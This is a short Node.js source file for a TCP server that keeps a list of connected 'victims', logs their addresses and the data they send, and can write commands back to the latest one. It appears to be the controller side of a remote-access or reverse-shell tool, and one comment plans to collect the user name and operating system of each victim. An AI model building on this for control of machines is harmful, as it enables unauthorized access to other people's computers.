const net = require('net');
class server {

    constructor(config = {}) {
        this.victims = { online : {}, offline: {}, error : {} };
        this.config = config;
        this.client = null;
        this.server = net.createServer();
        this.server.listen(config.port);
        console.log("Server Started\n");
    }

    init(){
        this.server.on("connection", c => this.onConnect(c) );
    }

    ConnectedDevicesCount(){
        return Object.keys(this.victims.online).length;
    }

    ConnectedDevices(){
        return this.victims.online;
    }

    onConnect(client){
        // add os and uesrname ...
        let ip = client.remoteAddress,
            family = client.remoteFamily,
            port = client.remotePort,
            connectionTime = (new Date).getTime();
        this.victims.online[client.remoteAddress] = {ip, family, port, connectionTime};
        this.client = client;
        client.on("close", e =>  this.onClientDisconnect(client) );
        client.on("data",  data => this.onData(data));

    }

    onClientDisconnect(client){
        console.log(`client disconnected ${client.remoteAddress}`);
        delete this.victims.online[client.remoteAddress]
    }

    onData(data){
        this.parseData(data);
    }

    parseData(data){
        console.log("DATA >>>", data.toString());
    }

    send(data){
        return this.client.write(data);
    }
}

module.exports = server;
